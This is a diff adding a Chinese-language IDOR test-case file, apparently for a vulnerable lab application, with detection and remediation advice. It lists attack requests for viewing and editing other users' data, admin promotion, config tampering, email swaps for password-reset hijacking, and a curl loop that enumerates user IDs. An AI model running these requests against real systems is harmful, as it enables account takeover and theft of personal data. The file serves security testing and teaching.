@@ -1,0 +1,334 @@
+# IDOR (Insecure Direct Object Reference) 漏洞测试用例
+# 漏洞类型: 不安全的直接对象引用
+# 危险等级: 中危 (Medium)
+# 分类: OWASP API Security Top 10 (API1:2019)
+
+# ============================================
+# 1. 水平越权 - 查看用户资料
+# ============================================
+# 场景: 用户 A 可以查看用户 B 的资料
+
+# 正常请求 - user1 查看自己的资料
+GET /idor/user/profile?id=1&currentUser=user1
+
+# 攻击请求 - user1 查看 user2 的资料
+GET /idor/user/profile?id=2&currentUser=user1
+
+# 攻击请求 - user1 查看管理员的资料
+GET /idor/user/profile?id=100&currentUser=user1
+
+
+# ============================================
+# 2. 水平越权 - 通过用户名查看资料
+# ============================================
+
+# 攻击请求 - user1 查看 user2 的资料
+GET /idor/user/profile/byname?username=user2&currentUser=user1
+
+# 攻击请求 - user1 查看管理员资料
+GET /idor/user/profile/byname?username=admin&currentUser=user1
+
+
+# ============================================
+# 3. 水平越权 - 查看他人订单
+# ============================================
+# 场景: 用户 A 可以查看用户 B 的订单
+
+# 正常请求 - user1 查看自己的订单
+GET /idor/order?id=1&userId=1
+
+# 攻击请求 - user1 查看 user2 的订单
+GET /idor/order?id=3&userId=1
+
+# 攻击请求 - user1 查看 user2 的所有订单
+GET /idor/order?id=4&userId=1
+
+
+# ============================================
+# 4. 水平越权 - 修改用户资料
+# ============================================
+
+# 攻击请求 - user1 修改 user2 的邮箱
+POST /idor/user/update?id=2&email=hacker@evil.com&currentUser=user1
+
+# 攻击请求 - user1 修改管理员邮箱
+POST /idor/user/update?id=100&email=hacker@evil.com&currentUser=user1
+
+# 攻击请求 - 修改他人邮箱为攻击者邮箱（用于密码重置劫持）
+POST /idor/user/update?id=2&email=attacker@gmail.com&currentUser=user1
+
+
+# ============================================
+# 5. 水平越权 - 删除他人订单
+# ============================================
+
+# 攻击请求 - user1 删除 user2 的订单
+POST /idor/order/delete?id=3&userId=1
+
+# 攻击请求 - user1 删除 user2 的所有订单
+POST /idor/order/delete?id=4&userId=1
+
+
+# ============================================
+# 6. 垂直越权 - 访问管理员配置
+# ============================================
+# 场景: 普通用户可以访问管理员配置
+
+# 攻击请求 - user1 访问管理员配置
+GET /idor/admin/config?currentUser=user1
+
+# 敏感信息可能包括:
+# - API 密钥
+# - 数据库连接字符串
+# - 第三方服务凭证
+# - 支付网关配置
+
+
+# ============================================
+# 7. 垂直越权 - 修改管理员配置
+# ============================================
+
+# 攻击请求 - user1 修改网站名称
+POST /idor/admin/config?key=site_name&value=Hacked+Site&currentUser=user1
+
+# 攻击请求 - user1 修改管理员邮箱（用于劫持密码重置）
+POST /idor/admin/config?key=admin_email&value=hacker@evil.com&currentUser=user1
+
+# 攻击请求 - user1 修改 secret_key
+POST /idor/admin/config?key=secret_key&value=hacker_secret_key&currentUser=user1
+
+# 攻击请求 - user1 启用调试模式
+POST /idor/admin/config?key=debug_mode&value=true&currentUser=user1
+
+
+# ============================================
+# 8. 垂直越权 - 提升用户权限
+# ============================================
+
+# 攻击请求 - user1 将自己提升为管理员
+POST /idor/admin/promote?id=1&role=admin&currentUser=user1
+
+# 攻击请求 - user1 将 user2 提升为管理员
+POST /idor/admin/promote?id=2&role=admin&currentUser=user1
+
+# 攻击请求 - 降级管理员为普通用户
+POST /idor/admin/promote?id=100&role=user&currentUser=user1
+
+
+# ============================================
+# 9. 垂直越权 - 查看所有用户
+# ============================================
+
+# 攻击请求 - user1 查看所有用户列表
+GET /idor/admin/users?currentUser=user1
+
+# 可能泄露的信息:
+# - 所有用户邮箱
+# - 用户 ID 枚举
+# - 用户角色信息
+
+
+# ============================================
+# 10. 组合攻击
+# ============================================
+
+# 攻击流程 1: 提权后访问管理功能
+# 步骤 1: 提升自己为管理员
+POST /idor/admin/promote?id=1&role=admin&currentUser=user1
+# 步骤 2: 访问管理员配置
+GET /idor/admin/config?currentUser=user1
+
+
+# 攻击流程 2: 劫持账户
+# 步骤 1: 修改目标用户邮箱
+POST /idor/user/update?id=2&email=attacker@gmail.com&currentUser=user1
+# 步骤 2: 请求密码重置（发送到 attacker@gmail.com）
+# 步骤 3: 重置目标用户密码
+
+
+# 攻击流程 3: 商业欺诈
+# 步骤 1: 查看他人订单获取地址信息
+GET /idor/order?id=3&userId=1
+# 步骤 2: 删除他人订单
+POST /idor/order/delete?id=3&userId=1
+# 步骤 3: 下单到自己地址（使用他人支付信息）
+
+
+# ============================================
+# 11. API IDOR 测试
+# ============================================
+
+# RESTful API 中的 IDOR
+# GET /api/v1/users/1
+# 攻击: GET /api/v1/users/2
+
+# GET /api/v1/orders/123
+# 攻击: GET /api/v1/orders/456
+
+# PUT /api/v1/users/1/profile
+# 攻击: PUT /api/v1/users/2/profile
+
+# DELETE /api/v1/orders/123
+# 攻击: DELETE /api/v1/orders/456
+
+
+# ============================================
+# 12. UUID 滥用
+# ============================================
+
+# 即使使用 UUID，如果可预测或可枚举，仍然存在 IDOR
+# 攻击方法:
+# 1. 分析 UUID 生成模式
+# 2. 枚举有效的 UUID
+# 3. 批量测试访问权限
+
+# 示例:
+# GET /api/users/a1b2c3d4-e5f6-7890-abcd-ef1234567890
+# 攻击: GET /api/users/a1b2c3d4-e5f6-7890-abcd-ef1234567891
+
+
+# ============================================
+# 13. 批量枚举攻击
+# ============================================
+
+# 使用 Burp Intruder 或自定义脚本批量测试
+# for i in {1..1000}; do curl "http://target/api/users/$i"; done
+
+# 测试用户 ID 枚举
+GET /idor/user/profile?id=1&currentUser=user1
+GET /idor/user/profile?id=2&currentUser=user1
+GET /idor/user/profile?id=3&currentUser=user1
+...
+
+
+# ============================================
+# 14. 检测方法
+# ============================================
+
+# 方法 1: 手动测试
+# 1. 登录为用户 A
+# 2. 记录请求中的 ID 参数
+# 3. 修改 ID 为其他用户的 ID
+# 4. 检查是否可以访问
+
+# 方法 2: 自动化扫描
+# - 使用 Burp Suite Pro 的 IDOR 扫描器
+# - 使用 OWASP ZAP 的 API 扫描
+# - 自定义脚本枚举 ID
+
+# 方法 3: 代码审计
+# 检查是否验证了:
+# - 用户是否有权访问请求的资源
+# - 资源是否属于当前用户
+# - 用户角色是否有足够的权限
+
+
+# ============================================
+# 15. 成功特征
+# ============================================
+
+# IDOR 漏洞存在的标志:
+# 1. 可以访问其他用户的资料
+# 2. 可以查看/修改/删除他人的资源
+# 3. 普通用户可以访问管理员功能
+# 4. 修改 ID 后响应不同但返回有效数据
+# 5. 没有访问拒绝错误
+# 6. 返回其他用户的敏感信息
+
+
+# ============================================
+# 16. 常见受影响的端点
+# ============================================
+
+# 用户相关:
+# /user/profile/{id}
+# /user/settings/{id}
+# /user/avatar/{id}
+
+# 订单相关:
+# /order/{id}
+# /order/{id}/items
+# /invoice/{id}
+
+# 文件相关:
+# /file/download/{id}
+# /document/{id}
+# /attachment/{id}
+
+# 消息相关:
+# /message/{id}
+# /chat/{id}/history
+
+# 管理相关:
+# /admin/config
+# /admin/users
+# /admin/settings
+
+
+# ============================================
+# 17. 修复建议
+# ============================================
+
+# 代码层面:
+# 1. 验证用户是否有权访问请求的资源
+# 2. 检查资源是否属于当前用户
+# 3. 实施基于角色的访问控制 (RBAC)
+# 4. 使用不可预测的标识符 (UUID)
+# 5. 记录访问日志用于审计
+
+# 示例代码:
+# if (!resource.ownerId.equals(currentUser.id) && !currentUser.isAdmin()) {
+#     return "Access Denied";
+# }
+
+# 配置层面:
+# 1. 启用访问控制
+# 2. 配置角色权限
+# 3. 启用审计日志
+
+# 测试层面:
+# 1. 添加 IDOR 测试用例
+# 2. 进行渗透测试
+# 3. 定期安全审计
+
+
+# ============================================
+# 18. Burp Suite 测试
+# ============================================
+
+# 使用 Burp Intruder:
+# 1. 抓取包含 ID 的请求
+# 2. 将 ID 标记为 payload 位置
+# 3. 配置 payload 类型 (Numbers, List)
+# 4. 设置 grep 匹配规则检测成功响应
+# 5. 启动攻击
+
+
+# ============================================
+# 19. 真实案例
+# ============================================
+
+# 案例 1: Facebook (2018)
+# - 漏洞: 用户可以查看其他用户的私密照片
+# - 影响: 680 万用户受影响
+# - 原因: 相册 ID 可预测且无权限验证
+
+# 案例 2: PayPal (2019)
+# - 漏洞: 用户可以查看其他用户的交易记录
+# - 影响: 财务数据泄露
+# - 原因: 交易 ID 可枚举
+
+# 案例 3: Tesla (2017)
+# - 漏洞: 用户可以查看其他车主的车辆信息
+# - 影响: 车辆位置和个人信息泄露
+# - 原因: 车辆 ID 可预测
+
+
+# ============================================
+# 20. 参考资料
+# ============================================
+
+# - OWASP API Security Top 10: https://owasp.org/www-project-api-security/
+# - OWASP Top 10 2021 - A01: Broken Access Control
+# - PortSwigger: IDOR vulnerabilities
+# - HackerOne: IDOR reports
